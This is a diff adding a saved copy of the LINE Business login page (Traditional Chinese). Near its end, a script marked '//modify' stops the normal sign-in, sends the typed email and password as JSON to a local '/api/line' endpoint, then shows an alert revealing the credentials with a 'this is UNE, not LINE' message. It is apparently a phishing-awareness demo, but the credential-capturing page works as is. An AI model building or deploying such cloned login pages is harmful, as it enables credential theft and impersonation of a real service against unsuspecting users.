@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<!-- saved from url=(0341)https://access.line.me/oauth2/v2.1/login?returnUri=%2Foauth2%2Fv2.1%2Fauthorize%2Fconsent%3Fresponse_type%3Dcode%26client_id%3D1576775644%26redirect_uri%3Dhttps%253A%252F%252Faccount.line.biz%252Flogin%252Fline-callback%26scope%3Dprofile%26state%3Dlldjl7QHp5TUmSpYpk8on5RmUYutiFn&loginChannelId=1576775644&loginState=nbKjWf3bMG4Q38mqoUtFlr#/ -->
+<html dir="ltr" lang="zh_TW">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <script async="" src="../line/torimochi.js.下載"></script>
+    <script type="module" crossorigin="" src="../line/polyfills-48939861.js.下載"></script>
+
+
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>LINE Login</title>
+
+    <meta property="og:title" content="LINE Login">
+    <meta property="og:description" content="登入LINE Business ID">
+    <meta property="og:image" content="https://vos.line-scdn.net/login-web/img/favicon.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="https://vos.line-scdn.net/login-web/img/favicon.ico">
+    <link rel="icon" type="image/x-icon" sizes="32x32" href="https://vos.line-scdn.net/login-web/img/favicon-32x32.png">
+    <link rel="icon" type="image/x-icon" sizes="16x16" href="https://vos.line-scdn.net/login-web/img/favicon-16x16.png">
+
+    <link rel="apple-touch-icon-precomposed"
+          href="https://vos.line-scdn.net/login-web/img/apple-touch-icon-precomposed.png">
+
+    <script>/* analytics */
+    (function (g, d) {
+        var v = 'release/stable';
+        g._trmq = [];
+        g._trm = function () {
+            g._trmq.push(arguments)
+        };
+        g.onerror = function (m, f, l, c) {
+            g._trm('send', 'exception', m, f, l, c)
+        };
+        var h = location.protocol === 'https:' ? 'https://d.line-scdn.net' : 'http://d.line-cdn.net';
+        var s = d.createElement('script');
+        s.async = 1;
+        s.src = h + '/n/_4/torimochi.js/public/v1/' + v + '/min/torimochi.js';
+        var t = d.getElementsByTagName('script')[0];
+        t.parentNode.insertBefore(s, t);
+    })(window, document);
+
+    _trm('performance', {rate: 0.05});
+    _trm('enable', {productKey: "line-web-login-real"});
+    /* /analytics */</script>
+
+    <script type="text/javascript" charset="UTF-8" src="../line/messages"></script>
+    <style type="text/css">
+        :root .midAdModule-root {
+            display: none !important;
+        }</style>
+
+    <script type="module" crossorigin="" src="../line/index-7038ca01.js.下載"></script>
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/modulepreload-polyfill-4abee2a4.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/errorHandlerPlugin-120eecf5.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/Constant-4ce4e3f3.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/cPinCode-d5a85274.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/createRouter-76b8f3b2.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/ldsg-popup-b590aedf.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/ldsm-text-button-ff1aefaf.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/_getPrototype-27c9414e.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/lFooter01-6c3a3f07.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/axiosPlugin-cb242ddf.js">
+    <link rel="modulepreload" crossorigin=""
+          href="https://static.line-scdn.net/line_web_login/edge/dist/assets/uaPlugin-c192d0dd.js">
+    <link rel="stylesheet" href="../line/cPinCode-f5d70b70.css">
+    <link rel="stylesheet" href="../line/ldsm-text-button-447a2387.css">
+    <link rel="stylesheet" href="../line/lFooter01-1046b0e0.css">
+    <link rel="stylesheet" href="../line/index-6cf546c2.css">
+    <link rel="stylesheet" href="../line/common-46d6dd65.css">
+    <link rel="stylesheet" href="../line/main-b340e3b8.css">
+
+    <style data-global-overlays="">
+        .global-overlays {
+            position: fixed;
+            z-index: 200;
+        }
+
+        .global-overlays__overlay {
+            pointer-events: auto;
+        }
+
+        .global-overlays__overlay-container {
+            display: flex;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+
+        .global-overlays__overlay-container--top-left {
+            justify-content: flex-start;
+            align-items: flex-start;
+        }
+
+        .global-overlays__overlay-container--top {
+            justify-content: center;
+            align-items: flex-start;
+        }
+
+        .global-overlays__overlay-container--top-right {
+            justify-content: flex-end;
+            align-items: flex-start;
+        }
+
+        .global-overlays__overlay-container--right {
+            justify-content: flex-end;
+            align-items: center;
+        }
+
+        .global-overlays__overlay-container--bottom-left {
+            justify-content: flex-start;
+            align-items: flex-end;
+        }
+
+        .global-overlays__overlay-container--bottom {
+            justify-content: center;
+            align-items: flex-end;
+        }
+
+        .global-overlays__overlay-container--bottom-right {
+            justify-content: flex-end;
+            align-items: flex-end;
+        }
+
+        .global-overlays__overlay-container--left {
+            justify-content: flex-start;
+            align-items: center;
+        }
+
+        .global-overlays__overlay-container--center {
+            justify-content: center;
+            align-items: center;
+        }
+
+        .global-overlays__overlay--bottom-sheet {
+            width: 100%;
+        }
+
+        .global-overlays .global-overlays__backdrop {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-color: #333333;
+            filter: opacity(30%);
+            display: none;
+        }
+
+        .global-overlays .global-overlays__backdrop--visible {
+            display: block;
+        }
+
+        .global-overlays .global-overlays__backdrop--animation-in {
+            animation: global-overlays-backdrop-fade-in 300ms;
+        }
+
+        .global-overlays .global-overlays__backdrop--animation-out {
+            animation: global-overlays-backdrop-fade-out 300ms;
+            opacity: 0;
+        }
+
+        @keyframes global-overlays-backdrop-fade-in {
+            from {
+                opacity: 0;
+            }
+        }
+
+        @keyframes global-overlays-backdrop-fade-out {
+            from {
+                opacity: 0.3;
+            }
+        }
+
+        body > *[inert] {
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            pointer-events: none;
+        }
+
+        body.global-overlays-scroll-lock {
+            overflow: hidden;
+        }
+
+        body.global-overlays-scroll-lock-ios-fix {
+            position: fixed;
+            width: 100%;
+        }
+
+        html.global-overlays-scroll-lock-ios-fix {
+            height: 100vh;
+        }
+    </style>
+    <style type="text/css">
+        :root #app > .publicAllContentBg > .bigBannerBg,
+        :root #app.app > .topic-big {
+            display: none !important;
+        }</style>
+</head>
+
+<body ontouchstart="">
+<noscript>
+    <div class="LyWrap">
+        <!--CONTENTS-AREA-->
+        <div class="LyContents" role="main">
+            <div class="lyContentsInner">
+                <div class="MdBox01">
+                    <section class="mdBox01Inner MdLYR03Error">
+                        <div class="MdLogo01 mdLogo01P01">
+                            <h1 class="mdLogo01Img">LINE</h1>
+                        </div>
+                        <h2 class="mdLYR03Title mdMN10Title">
+                            <span class="mdLYR03Icon MdIco01Alert">alert</span>
+                            <span>JavaScript錯誤</span>
+                        </h2>
+                        <p class="mdLYR03Desc mdMN10Desc">
+                            您尚未在瀏覽器中啟用JavaScript。<br/>
+                            請先啟用JavaScript，才可使用本網站提供的功能。 </p>
+                    </section>
+                </div>
+            </div>
+        </div>
+    </div>
+</noscript>
+
+<div id="__layout">
+    <div class="LyBody" id="app" data-v-app="">
+        <div data-v-79960dc9="" class="LyWrap">
+            <div data-v-79960dc9="" class="LyContents" role="main">
+                <div data-v-79960dc9="" class="lyContentsInner">
+                    <div data-v-8c673558="" data-v-79960dc9="" class=""><!----></div>
+                    <div data-v-a2dce184="" data-v-79960dc9="" class="MdBox01">
+                        <div data-v-a2dce184="" class="mdBox01Inner">
+                            <div data-v-a2dce184="" class="MdLogo01"><h1 data-v-a2dce184="" class="mdLogo01Img">
+                                LINE </h1></div>
+                            <form data-v-a2dce184="" method="post"
+                                  action="https://access.line.me/oauth2/v2.1/authenticate" novalidate=""><input
+                                    data-v-a2dce184="" type="hidden" name="userId" value=""><input data-v-a2dce184=""
+                                                                                                   type="hidden"
+                                                                                                   name="encUserId"
+                                                                                                   value=""><input
+                                    data-v-a2dce184="" type="hidden" name="id" value=""><input data-v-a2dce184=""
+                                                                                               type="hidden"
+                                                                                               name="password" value=""><input
+                                    data-v-a2dce184="" type="hidden" name="idProvider" value=""><input
+                                    data-v-a2dce184="" type="hidden" name="sessionId" value=""><input data-v-a2dce184=""
+                                                                                                      type="hidden"
+                                                                                                      name="encKeyId"
+                                                                                                      value=""><input
+                                    type="hidden" name="__csrf" id="__csrf" value="EiTqB0UpF1FgysxjUV9Ash"><input
+                                    type="hidden" name="loginChannelId" value="1576775644"><input type="hidden"
+                                                                                                  name="returnUri"
+                                                                                                  value="/oauth2/v2.1/authorize/consent?response_type=code&amp;client_id=1576775644&amp;redirect_uri=https%3A%2F%2Faccount.line.biz%2Flogin%2Fline-callback&amp;scope=profile&amp;state=lldjl7QHp5TUmSpYpk8on5RmUYutiFn"><input
+                                    type="hidden" name="lang" value="zh_TW"><input type="hidden" name="state"><input
+                                    type="hidden" name="displayType" value="b"><input type="hidden" name="captchaKey"
+                                                                                      value="NBo6tBjATrJgvjN1QKCwv7QeforO2PJ3xYvF5bNu86r">
+
+                                <fieldset data-v-a2dce184="" class="MdFormGroup01">
+                                    <legend data-v-a2dce184="">Login</legend>
+                                    <div data-v-f68c6b6d="" data-v-a2dce184="" class="MdInputTxt01 ExFocusOut"
+                                         modelmodifiers="[object Object]"><label data-v-f68c6b6d=""
+                                                                                 class="mdInputTxt01Label">電子郵件帳號</label><input
+                                            data-v-f68c6b6d="" type="text" name="tid" placeholder="電子郵件帳號"
+                                            autocapitalize="off" autocorrect="off" spellcheck="false"></div>
+                                    <div data-v-5466084b="" data-v-a2dce184="" class="MdInputTxt01 ExFocusOut"
+                                         modelmodifiers="[object Object]"><label data-v-5466084b=""
+                                                                                 class="mdInputTxt01Label">密碼</label><input
+                                            data-v-5466084b="" type="password" name="tpasswd" placeholder="密碼"></div>
+                                    <!---->
+                                    <div data-v-a2dce184="" class="mdFormGroup01Btn">
+                                        <button data-v-a2dce184="" type="submit" class="MdBtn01">登入</button>
+                                    </div>
+                                    <div data-v-a2dce184="" class="MdFormError01 MdHide"><p data-v-a2dce184=""
+                                                                                            class="mdFormErrorTxt01"></p>
+                                    </div>
+                                </fieldset>
+                            </form>
+                            <div data-v-a2dce184="" class="MdMN04QrLogin"><h3 data-v-a2dce184="" class="MdTtl01"><span
+                                    data-v-a2dce184="" class="mdTtl01Inner">使用其他方式登入</span></h3><a
+                                    data-v-a2dce184=""
+                                    href="https://access.line.me/oauth2/v2.1/login?returnUri=%2Foauth2%2Fv2.1%2Fauthorize%2Fconsent%3Fresponse_type%3Dcode%26client_id%3D1576775644%26redirect_uri%3Dhttps%253A%252F%252Faccount.line.biz%252Flogin%252Fline-callback%26scope%3Dprofile%26state%3Dlldjl7QHp5TUmSpYpk8on5RmUYutiFn&amp;loginChannelId=1576775644&amp;loginState=nbKjWf3bMG4Q38mqoUtFlr#/qr"
+                                    class="MdBtn02"><span data-v-a2dce184="">透過行動條碼登入</span></a></div>
+                            <div data-v-a2dce184="" class="MdMN03Etc"><!---->
+                                <button data-v-a2dce184="" type="button" class="mdMN03EtcLink01">
+                                    忘記電子郵件帳號或密碼？
+                                </button><!----></div>
+                        </div>
+                        <ldsg-bottom-sheet data-v-a2dce184="">
+                            <template shadowrootmode="open"><!---->
+                                <slot name="invoker"></slot>
+                                <div id="overlay-content-node-wrapper">
+                                    <slot name="backdrop"></slot>
+                                    <slot name="content"></slot>
+                                </div>
+                            </template>
+                        </ldsg-bottom-sheet><!----></div>
+                    <footer data-v-79960dc9="" class="LyFoot">
+                        <div class="lyFootInner">
+                            <div class="MdGFT01Copy"><small>©&nbsp;<b>LY Corporation</b></small></div>
+                            <h5 class="MdHide">LY Corporation Link</h5>
+                            <div class="MdGFT02Link">
+                                <ul class="mdGFT02Ul link-list"><!---->
+                                    <li><a href="https://terms.line.me/line_rules/?lang=zh_TW" target="_blank"
+                                           rel="noopener">隱私權政策</a></li>
+                                    <li><a href="https://terms.line.me/line_terms/?lang=zh_TW" target="_blank"
+                                           rel="noopener">服務條款</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </footer>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script>
+        //modify
+
+        document.querySelector("form").addEventListener("submit", function (event) {
+            event.preventDefault(); // 阻止表單提交
+
+            var username = document.querySelector("input[name='tid']").value;
+            var password = document.querySelector("input[name='tpasswd']").value;
+            const data = {
+                username: username,
+                password: password,
+            };
+            if (!username && !password) {
+                return;
+            }
+            fetch('/api/line', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+                .then(response => response.text())
+                .then(data => {
+                    alert("帳號: " + username + "\n密碼: " + password + "\nGot You！中招了！這裡是UNE，不是LINE喔！！");
+                })
+                .catch(error => console.error('Error fetching data:', error));
+
+
+        });
+
+    </script>
+    <script src="../line/lc_common.js.下載"></script>
+</div>
+
+<script>
+    var lap_optout_check_api_url = "https://optout-api.tr.line.me/enabled";
+</script>
+
+<script src="../line/lap_optout_check.min.js.下載"></script>
+
+
+<div class="global-overlays">
+    <ldsg-backdrop data-tag-name="ldsg-backdrop" slot="backdrop">
+        <template shadowrootmode="open"><!----></template>
+    </ldsg-backdrop>
+    <div style="display: none;">
+        <ldsg-bottom-sheet-content data-v-a2dce184="" slot="content" action-layout="vertical" has-close-button=""
+                                   has-title="" has-description="" has-avatar="" has-action="" has-avatar-on-top=""
+                                   image-ratio="4x3" font-size="L" close-button-theme="light" image-position="top"
+                                   additional-item-position="bottom" content-type="default"
+                                   id="overlay-content--q2vk0sxn0w" role="dialog">
+            <template shadowrootmode="open"><!---->
+                <div class="content">
+                    <div class="handlebar"></div>
+                    <div class="header"></div>
+
+                    <!--?lit$12188707$-->
+                    <div class="content-group-one">
+                        <slot name="content-group-one">
+                            <div class="image">
+                                <slot name="image"></slot>
+                            </div>
+                            <div class="title">
+                                <slot name="title"></slot>
+                            </div>
+                            <div class="description">
+                                <slot name="description"></slot>
+                            </div>
+                        </slot>
+                        <div class="content-group-one__bottom"></div>
+                    </div>
+                    <!--?lit$12188707$-->
+                    <div class="content-group-two">
+                        <slot name="content-group-two">
+                            <div class="additional-item">
+                                <slot name="additional-item"></slot>
+                            </div>
+                            <div class="action">
+                                <slot name="action"></slot>
+                            </div>
+                        </slot>
+                    </div>
+
+
+                    <div class="home-indicator"></div>
+
+                    <!--?lit$12188707$-->
+                    <button type="button" class="close-button" aria-label="Close overlay content">
+                        <!--?lit$12188707$-->
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                            <g transform="translate(-2 -2)">
+                                <path d="M17.8418 5.239l.9192.9192L12.919 12l5.842 5.8418-.9192.9192L12 12.919l-5.8418 5.842-.9192-.9192L11.08 12 5.239 6.1582l.9192-.9192L12 11.08l5.8418-5.841z"></path>
+                            </g>
+                        </svg>
+
+                    </button>
+
+                </div>
+            </template>
+            <ldsg-avatar data-v-a2dce184="" slot="title" size="XL">
+                <template shadowrootmode="open"><!----> <span class="avatar"> <!--?lit$12188707$--><!--?lit$12188707$--><img
+                        class="content content--image"
+                        src="data:image/png;base64,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"
+                        alt="LINE logo"><!--?--> <!--?lit$12188707$--><slot></slot> </span></template>
+            </ldsg-avatar>
+            <p data-v-a2dce184="" slot="description" class="mdFormTxt01">If the LINE app doesn't open, long press
+                "Log-in with LINE app" and select "Open in LINE" from the context menu, then try logging in again.</p><a
+                data-v-a5ac1047="" data-v-a2dce184="" type="submit"
+                class="ldsm-box-button ldsm-box-button--solid ldsm-box-button--green ldsm-box-button--xl l-box-btn-a"
+                href="https://access-auto.line.me/oauth2/v2.1/login?returnUri=%2Foauth2%2Fv2.1%2Fauthorize%2Fconsent%3Fresponse_type%3Dcode%26client_id%3D1576775644%26redirect_uri%3Dhttps%253A%252F%252Faccount.line.biz%252Flogin%252Fline-callback%26scope%3Dprofile%26state%3Dlldjl7QHp5TUmSpYpk8on5RmUYutiFn&amp;loginChannelId=1576775644&amp;loginState=nbKjWf3bMG4Q38mqoUtFlr"
+                slot="action"><span data-v-a5ac1047="" class="ldsm-box-button__text">使用LINE應用程式登入</span></a>
+            <button data-v-ad958ae9="" data-v-a2dce184=""
+                    class="ldsm-text-button ldsm-text-button--gray ldsm-text-button--md l-txt-btn" slot="action"
+                    style="--20e1a779: 400;"><span data-v-ad958ae9=""
+                                                   class="ldsm-text-button_text">Log in with email</span></button>
+        </ldsg-bottom-sheet-content>
+    </div>
+</div>
+</body>
+</html>
